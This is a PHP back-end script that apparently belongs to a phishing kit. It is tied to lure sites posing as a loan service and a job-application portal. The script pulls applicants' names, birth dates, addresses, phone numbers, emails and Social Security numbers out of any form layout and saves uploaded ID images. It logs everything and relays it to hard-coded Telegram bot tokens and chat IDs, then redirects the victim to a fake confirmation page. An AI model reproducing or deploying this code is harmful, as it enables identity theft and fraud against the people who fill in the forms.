<?php
// 🚨 Enhanced server configuration for file uploads
ini_set('upload_max_filesize', '10M');
ini_set('post_max_size', '12M');
ini_set('max_execution_time', 120);
ini_set('max_input_time', 120);
ini_set('memory_limit', '256M');

ob_start();

// 🌐 Site map: define how each site should behave
$site_map = [
    "upstartloan.rf.gd" => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
        ],
        "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
    ],

    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
    ],
    
    // Add more sites...
];

// 🧠 Determine origin domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Access denied: Unauthorized site ($domain).");
}

// 🚀 Handle POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 📝 Log file
    $log_file = __DIR__ . "/logs/job_applications.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    // 🎯 DEBUG: Log ALL received data
    log_entry("=== NEW SUBMISSION STARTED ===");
    log_entry("📨 Domain: $domain");
    log_entry("📊 ALL POST DATA: " . print_r($_POST, true));
    log_entry("📁 ALL FILES DATA: " . print_r($_FILES, true));
    log_entry("🔍 RAW POST: " . file_get_contents("php://input"));

    // 🌐 Get client IP
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    
    $timestamp = date("Y-m-d H:i:s");

    // 🔍 UNIVERSAL FIELD EXTRACTION - Works with ANY form structure
    function extractFormData() {
        $data = [
            'full_name' => '',
            'dob' => '',
            'address' => '',
            'email' => '',
            'phone' => '',
            'position' => '',
            'job_type' => '',
            'source' => '',
            'ssn' => ''
        ];
        
        // Strategy 1: Common field name patterns
        $name_patterns = ['name', 'fullname', 'full_name', 'username', 'fullName', 'q11_fullName'];
        $email_patterns = ['email', 'emailAddress', 'q12_emailAddress'];
        $phone_patterns = ['phone', 'telephone', 'phoneNumber', 'mobile', 'q13_phoneNumber13'];
        $dob_patterns = ['dob', 'birthdate', 'birthDate', 'q18_birthDate'];
        $address_patterns = ['address', 'currentAddress', 'q16_currentAddress'];
        $position_patterns = ['position', 'job', 'positionApplied', 'q14_positionApplied'];
        $ssn_patterns = ['ssn', 'social', 'socSec', 'q25_socSec'];
        
        // Search through all POST data
        foreach ($_POST as $key => $value) {
            $key_lower = strtolower($key);
            
            // Name detection
            if (empty($data['full_name'])) {
                foreach ($name_patterns as $pattern) {
                    if (strpos($key_lower, strtolower($pattern)) !== false) {
                        if (is_array($value)) {
                            // Handle structured name (first, middle, last)
                            $first = $value['first'] ?? $value[0] ?? '';
                            $middle = $value['middle'] ?? $value[1] ?? '';
                            $last = $value['last'] ?? $value[2] ?? '';
                            $data['full_name'] = trim("$first $middle $last");
                        } else {
                            $data['full_name'] = htmlspecialchars($value);
                        }
                        break;
                    }
                }
            }
            
            // Email detection
            if (empty($data['email']) && preg_match('/email|mail/i', $key)) {
                $data['email'] = htmlspecialchars($value);
            }
            
            // Phone detection
            if (empty($data['phone']) && preg_match('/phone|mobile|tel/i', $key)) {
                if (is_array($value) && isset($value['full'])) {
                    $data['phone'] = htmlspecialchars($value['full']);
                } else {
                    $data['phone'] = htmlspecialchars($value);
                }
            }
            
            // DOB detection
            if (empty($data['dob'])) {
                foreach ($dob_patterns as $pattern) {
                    if (strpos($key_lower, strtolower($pattern)) !== false) {
                        if (is_array($value)) {
                            // Handle structured date
                            $year = $value['year'] ?? $value[0] ?? '0000';
                            $month = $value['month'] ?? $value[1] ?? '00';
                            $day = $value['day'] ?? $value[2] ?? '00';
                            $data['dob'] = sprintf("%04d-%02d-%02d", $year, $month, $day);
                        } else {
                            $data['dob'] = htmlspecialchars($value);
                        }
                        break;
                    }
                }
            }
            
            // Address detection
            if (empty($data['address'])) {
                foreach ($address_patterns as $pattern) {
                    if (strpos($key_lower, strtolower($pattern)) !== false) {
                        if (is_array($value)) {
                            $addr_line1 = $value['addr_line1'] ?? $value['line1'] ?? $value[0] ?? '';
                            $addr_line2 = $value['addr_line2'] ?? $value['line2'] ?? $value[1] ?? '';
                            $city = $value['city'] ?? $value[2] ?? '';
                            $state = $value['state'] ?? $value[3] ?? '';
                            $postal = $value['postal'] ?? $value['zip'] ?? $value[4] ?? '';
                            $data['address'] = trim("$addr_line1 $addr_line2, $city, $state, $postal");
                        } else {
                            $data['address'] = htmlspecialchars($value);
                        }
                        break;
                    }
                }
            }
            
            // Position detection
            if (empty($data['position']) && preg_match('/position|job|role/i', $key)) {
                $data['position'] = htmlspecialchars($value);
            }
            
            // SSN detection
            if (empty($data['ssn']) && preg_match('/ssn|social|security/i', $key)) {
                $data['ssn'] = htmlspecialchars($value);
            }
        }
        
        // Strategy 2: Direct field access as fallback
        if (empty($data['full_name'])) {
            $data['full_name'] = htmlspecialchars($_POST['full_name'] ?? $_POST['name'] ?? '');
        }
        if (empty($data['email'])) {
            $data['email'] = htmlspecialchars($_POST['email'] ?? '');
        }
        if (empty($data['phone'])) {
            $data['phone'] = htmlspecialchars($_POST['phone'] ?? '');
        }
        if (empty($data['dob'])) {
            $data['dob'] = htmlspecialchars($_POST['dob'] ?? '');
        }
        if (empty($data['address'])) {
            $data['address'] = htmlspecialchars($_POST['address'] ?? '');
        }
        if (empty($data['position'])) {
            $data['position'] = htmlspecialchars($_POST['position'] ?? '');
        }
        if (empty($data['ssn'])) {
            $data['ssn'] = htmlspecialchars($_POST['ssn'] ?? '');
        }
        
        return $data;
    }

    // Extract form data using universal method
    $form_data = extractFormData();
    
    // Log extracted data for debugging
    log_entry("🎯 EXTRACTED FORM DATA: " . print_r($form_data, true));

    // 📦 ENHANCED: Universal file upload handler
    function uploadAnyFile($file_key = null) {
        static $uploaded_files = [];
        static $file_counter = 0;
        
        $upload_dir = __DIR__ . "/uploads/";
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

        // If specific key provided, try that first
        if ($file_key && isset($_FILES[$file_key])) {
            return uploadFile($file_key, "file_" . $file_key);
        }
        
        // Otherwise, upload all files in FILES array
        foreach ($_FILES as $key => $file_data) {
            if (!empty($file_data['name'][0]) && $file_data['error'][0] === UPLOAD_ERR_OK) {
                $file_path = uploadFile($key, "file_" . (++$file_counter));
                if ($file_path) {
                    $uploaded_files[$key] = $file_path;
                }
            }
        }
        
        return $uploaded_files;
    }

    function uploadFile($key, $prefix) {
        $upload_dir = __DIR__ . "/uploads/";
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

        if (!isset($_FILES[$key]) || empty($_FILES[$key]['name'][0])) {
            return null;
        }

        $file_data = $_FILES[$key];
        
        if ($file_data['error'][0] !== UPLOAD_ERR_OK) {
            return null;
        }

        $original = $file_data['name'][0];
        $tmp_name = $file_data['tmp_name'][0];
        $size = $file_data['size'][0];

        // Get file extension
        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
        
        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'doc', 'docx'];
        
        if (!in_array($ext, $allowed_extensions)) {
            return null;
        }
        
        // Generate safe filename
        $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(4)) . "." . $ext;
        $path = $upload_dir . $safe_name;

        if (move_uploaded_file($tmp_name, $path)) {
            log_entry("✅ File uploaded: $safe_name");
            return $path;
        }
        
        return null;
    }

    // Upload files - try both specific keys and all files
    $front_id = uploadAnyFile("q17_uploadYour");
    $back_id = uploadAnyFile("q26_identityVerification");
    
    // If specific keys didn't work, get any uploaded files
    $all_files = uploadAnyFile();
    if (is_array($all_files)) {
        if (!$front_id && count($all_files) > 0) {
            $front_id = reset($all_files); // Get first file
        }
        if (!$back_id && count($all_files) > 1) {
            $back_id = end($all_files); // Get last file
        }
    }

    // 🧾 Format Telegram message with ALL available data
    $message = "📝 *New Form Submission*\n\n";
    
    if (!empty($form_data['full_name'])) {
        $message .= "👤 *Name:* {$form_data['full_name']}\n";
    }
    if (!empty($form_data['dob']) && $form_data['dob'] !== '0000-00-00') {
        $message .= "🎂 *DOB:* {$form_data['dob']}\n";
    }
    if (!empty($form_data['address']) && trim($form_data['address'], ' ,') !== '') {
        $message .= "🏠 *Address:* {$form_data['address']}\n";
    }
    if (!empty($form_data['email'])) {
        $message .= "📧 *Email:* {$form_data['email']}\n";
    }
    if (!empty($form_data['phone'])) {
        $message .= "📞 *Phone:* {$form_data['phone']}\n";
    }
    if (!empty($form_data['position'])) {
        $message .= "💼 *Position:* {$form_data['position']}\n";
    }
    if (!empty($form_data['ssn'])) {
        $message .= "🔐 *SSN:* {$form_data['ssn']}\n";
    }
    
    $message .= "\n🕒 *Submitted:* $timestamp\n";
    $message .= "🌐 *IP:* $ip\n";
    $message .= "📎 *Files Uploaded:* " . (($front_id || $back_id) ? "✅ Yes" : "❌ No");
    
    // Add all other POST data for debugging
    $message .= "\n\n🔍 *All Submitted Data:*\n";
    foreach ($_POST as $key => $value) {
        if (is_array($value)) {
            $message .= "• $key: " . print_r($value, true) . "\n";
        } else {
            $clean_value = htmlspecialchars(substr($value, 0, 100)); // Limit length
            $message .= "• $key: $clean_value\n";
        }
    }

    // 📬 Send to Telegram
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            continue;
        }
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        if (curl_error($ch)) {
            log_entry("❌ Telegram error: " . curl_error($ch));
        } else {
            log_entry("✅ Message sent to bot $bot_index");
        }
        curl_close($ch);
    }

    log_entry("✅ [$domain] Form submission completed from $ip");

    ob_end_clean();
    header("Location: " . $config['redirect']);
    exit;
}
?>
